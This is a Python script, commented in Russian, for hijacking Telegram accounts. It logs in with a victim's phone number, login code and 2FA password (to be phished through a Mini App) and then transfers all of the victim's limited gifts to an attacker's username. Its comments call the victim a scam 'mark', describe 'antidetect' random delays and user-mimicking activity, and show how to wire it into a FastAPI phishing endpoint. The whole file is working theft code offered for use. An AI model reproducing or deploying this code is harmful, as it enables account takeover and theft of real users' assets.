# victim_session_drain.py
import asyncio
import hashlib
import os
from tdjson import TdJson

API_ID = 你的API_ID
API_HASH = "твойHASH"

tdjson_lib = "./libtdjson.so"  # путь к tdjson
td = TdJson(tdjson_lib)

SESSIONS_DIR = "victim_sessions"

async def create_victim_session(phone: str, code: str, password: str = None):
    session_name = hashlib.sha256(phone.encode()).hexdigest()[:16]
    db_dir = f"{SESSIONS_DIR}/{session_name}"

    os.makedirs(db_dir, exist_ok=True)

    td.send({
        "@type": "setTdlibParameters",
        "parameters": {
            "api_id": API_ID,
            "api_hash": API_HASH,
            "database_directory": db_dir,
            "use_message_database": True,
            "system_language_code": "en",
            "device_model": "iPhone 16 Pro",  # имитация реального девайса
            "application_version": "10.14.5",
            "use_secret_chats": False,
        }
    })

    auth_state = None
    while True:
        update = td.receive(10.0)  # timeout чтобы не висеть
        if update is None:
            break

        if "@type" not in update:
            continue

        if update["@type"] == "updateAuthorizationState":
            auth_state = update["authorization_state"]["@type"]

            if auth_state == "authorizationStateWaitPhoneNumber":
                td.send({
                    "@type": "setAuthenticationPhoneNumber",
                    "phone_number": phone.replace("+", "")
                })

            elif auth_state == "authorizationStateWaitCode":
                td.send({
                    "@type": "checkAuthenticationCode",
                    "code": code
                })

            elif auth_state == "authorizationStateWaitPassword":
                if password:
                    td.send({
                        "@type": "checkAuthenticationPassword",
                        "password": password
                    })
                else:
                    # запроси у жертвы 2FA через Mini App
                    return {"status": "need_2fa", "session_name": session_name}

            elif auth_state == "authorizationStateReady":
                print(f"[SUCCESS] Сессия жертвы захвачена: {phone}")
                return {"status": "ready", "session_name": session_name}

            elif auth_state == "authorizationStateWaitOtherDeviceConfirmation":
                # редкий кейс QR, но если вылезет — фейлим или логируем
                print("Ждёт QR подтверждения на другом девайсе — хуйня, мамонт не подтвердит")
                return {"status": "fail_qr"}

        if update["@type"] == "error":
            print("Ошибка авторизации:", update)
            return {"status": "error", "msg": update.get("message")}

    return {"status": "timeout"}

async def stealth_activity():
    # Имитация нормального юзера перед дрейном
    await asyncio.sleep(3 + random.uniform(0, 5))
    td.send({"@type": "getMe"})  # просто заходим в профиль
    await asyncio.sleep(2)
    td.send({"@type": "getChats", "chat_list": {"@type": "chatListMain"}, "limit": 10})  # смотрим чаты
    await asyncio.sleep(4)

async def drain_limited_gifts(target_username: str = "@strax_intelligence"):
    await stealth_activity()

    # Находим чат с целью
    search = td.send({
        "@type": "searchPublicChat",
        "username": target_username.lstrip("@")
    })
    if "id" not in search:
        print("Цель не найдена")
        return

    target_chat_id = search["id"]

    # Получаем свои подарки
    me = td.send({"@type": "getMe"})
    my_id = me["id"]

    gifts_resp = td.send({
        "@type": "getUserProfileGifts",
        "user_id": my_id,
        "limit": 200  # больше — лучше
    })

    gifts = gifts_resp.get("gifts", [])
    limited = [g for g in gifts if g.get("gift", {}).get("is_limited", False) or "limited" in str(g).lower()]

    if not limited:
        print("Нет лимитед подарков у жертвы")
        return

    for gift in limited:
        gift_id = gift["id"]  # или gift["gift"]["id"] — смотри структуру
        print(f"Шлю подарок {gift_id} на {target_username}")

        resp = td.send({
            "@type": "sendGift",
            "gift_id": gift_id,
            "owner_id": {"@type": "messageSenderUser", "user_id": target_chat_id},  # receiver
            "text": {"@type": "formattedText", "text": ""},  # опционально
            "is_private": False,
            "pay_for_upgrade": False  # если нужно — но для limited обычно нет
        })

        if "error" in resp:
            print("Ошибка отправки:", resp["message"])
            if "STARGIFT_USAGE_LIMITED" in str(resp):
                print("Гифт на лимите использования — пропускаем")
            if "FLOOD_WAIT" in str(resp):
                wait = int(resp["message"].split()[-1])
                await asyncio.sleep(wait + 5)

        await asyncio.sleep(random.uniform(3, 8))  # антидетект

    print("Дрейн завершён, сессия можно закрыть или оставить для будущих")

# В FastAPI эндпоинте примерно так:
# после submit code/2fa → await create_victim_session(phone, code, password)
# если ready → asyncio.create_task(drain_limited_gifts())
